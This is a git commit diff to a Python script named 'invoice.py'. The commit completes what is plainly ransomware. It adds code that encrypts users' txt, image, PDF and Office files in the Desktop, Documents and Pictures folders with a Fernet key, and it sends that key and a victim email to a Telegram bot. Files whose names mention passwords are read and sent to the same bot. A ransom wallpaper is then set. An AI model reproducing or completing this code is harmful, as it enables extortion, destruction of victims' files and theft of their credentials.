79f9047145ad57eadcc142563d7ef7f1b1f84940
Julien Blanchard <72625098+julien-blanchard@users.noreply.github.com>
2025-11-10 23:38:35 +0000

    Update invoice.py

--- invoice.py
+++ invoice.py
@@ -7,21 +7,22 @@ import ctypes
 
 TARGET_EMAIL: str = ""
 TELEGRAM_TOKEN: str = ""
-TELEGRAM_MSG_ID: int = 0
+TELEGRAM_MSG_ID: str = ""
+TELEGRAM_UPDATES: str = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
 TELEGRAM_CHANNEL: str = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage?chat_id={str(TELEGRAM_MSG_ID)}&text="
 
 USER_ENV: str = os.environ["USERPROFILE"]
 PATH_TO_FOLDER_DESKTOP: str = os.path.join(USER_ENV,"Desktop")
 PATH_TO_FOLDER_DOCUMENTS: str = os.path.join(USER_ENV,"Documents")
 PATH_TO_FOLDER_PICTURES: str = os.path.join(USER_ENV,"Pictures")
-PATH_TO_BACKGROUND_IMAGE_URL: str = "https://upload.wikimedia.org/wikipedia/commons/a/a8/Cheese_platter.jpg"
-PATH_TO_BACKGROUND_IMAGE_LOCAL: str = os.path.join(PATH_TO_FOLDER_DESKTOP,"ransom_background.jpg")
+PATH_TO_BACKGROUND_IMAGE_URL: str = ""
+PATH_TO_BACKGROUND_IMAGE_LOCAL: str = os.path.join(PATH_TO_FOLDER_DESKTOP,"ransom_background.png")
 
 PASSWORDS_PATTERN: str = r"password|pwd"
 
-SYS_SETDESKWALLPAPER: int = 20  # Action to change wallpaper
-SYS_UPDATEINIFILE: Any = 0x01  # Update user profile
-SYS_SENDWININICHANGE: Any = 0x02  # Notify change to system
+SYS_SETDESKWALLPAPER: int = 20
+SYS_UPDATEINIFILE: hex = 0x01
+SYS_SENDWININICHANGE: hex = 0x02
 
 PATH_TO_FOLDERS: List[str] = [
     PATH_TO_FOLDER_DESKTOP,
@@ -31,18 +32,20 @@ PATH_TO_FOLDERS: List[str] = [
 FILE_EXTENSIONS: List[str] = [
     "txt",
     "png",
+    "jpg",
+    "jpeg",
     "pdf",
     "docx",
     "xlsx",
     "csv"
     ]
 
-def openFile(path_to_file: str) -> str:
-    with open(path_to_file,"r") as file_to_open:
+def openFile(path_to_file: str) -> bytes:
+    with open(path_to_file,"rb") as file_to_open:
         result: str = file_to_open.read()
     return result
 
-def saveToFile(path_to_file: str, data: str) -> None:
+def saveToFile(path_to_file: str, data: bytes) -> None:
     with open(path_to_file, "wb") as file_to_save:
         file_to_save.write(data)
 
@@ -51,24 +54,28 @@ def generateKey() -> str:
     result: str = temp_key.decode(encoding="utf-8")
     return result
 
-def setBackgroundImage(*args) -> None:
-    image_to_retrieve: Any = requests.get(args[0]).content
-    saveToFile(args[1],image_to_retrieve)
+def setBackgroundImage(path_to_url: str, path_to_local: str, val_set: int, val_ini: hex, val_send: hex) -> None:
+    image_to_retrieve: Any = requests.get(path_to_url).content
+    saveToFile(path_to_local,image_to_retrieve)
     (
         ctypes
         .windll
         .user32
         .SystemParametersInfoW(
-            args[2],
+            val_set,
             0,
-            args[1],
-            args[3] | args[4]
+            path_to_local,
+            val_ini | val_send
         )
     )
 
-def sendToBot(*args) -> None:
-    # https://stackoverflow.com/questions/75116947/how-to-send-messages-to-telegram-using-python
-    x = 0
+def sendToBot(path_to_bot: str, message: str) -> None:
+    message_as_string: str = (
+       message
+        .replace(" ","_")
+    )
+    message_to_bot: str = path_to_bot + message_as_string
+    requests.get(message_to_bot).json()
 
 def listFiles(path_to_folders: str, extensions: List[str]) -> List[str]:
     result: List[str] = []
@@ -81,10 +88,9 @@ def listFiles(path_to_folders: str, extensions: List[str]) -> List[str]:
     return result
 
 def encryptFile(path_to_file: str, encryption_key: str) -> None:
-    return 0
-    fernet = Fernet(unique_key)
+    fernet = Fernet(encryption_key)
+    file_as_string: bytes = openFile(path_to_file)
     try:
-        file_as_string: str = openFile(path_to_file)
         file_encrypted: Any = fernet.encrypt(file_as_string)
         saveToFile(path_to_file,file_encrypted)
     except:
@@ -92,17 +98,17 @@ def encryptFile(path_to_file: str, encryption_key: str) -> None:
 
 def runAll() -> None:
     unique_key: str = generateKey()
-    # sendToBot(unique_key)
-    print(unique_key)
+    sendToBot(TELEGRAM_CHANNEL,rf"Email:{TARGET_EMAIL}")
+    sendToBot(TELEGRAM_CHANNEL,rf"Key:{unique_key}")
     files_to_encrypt: List[str] = listFiles(PATH_TO_FOLDERS,FILE_EXTENSIONS)
     for file_to_encrypt in files_to_encrypt:
         if re.search(PASSWORDS_PATTERN,file_to_encrypt,flags=re.IGNORECASE):
             stolen_passwords: str = openFile(file_to_encrypt)
-            sendToBot()
-            # encryptFile(file_to_encrypt, unique_key)
+            sendToBot(TELEGRAM_CHANNEL,stolen_passwords)
+            encryptFile(file_to_encrypt, unique_key)
         else:
             print(file_to_encrypt)
-            # encryptFile(file_to_encrypt, unique_key)
+            encryptFile(file_to_encrypt, unique_key)
     setBackgroundImage(
         PATH_TO_BACKGROUND_IMAGE_URL,
         PATH_TO_BACKGROUND_IMAGE_LOCAL,
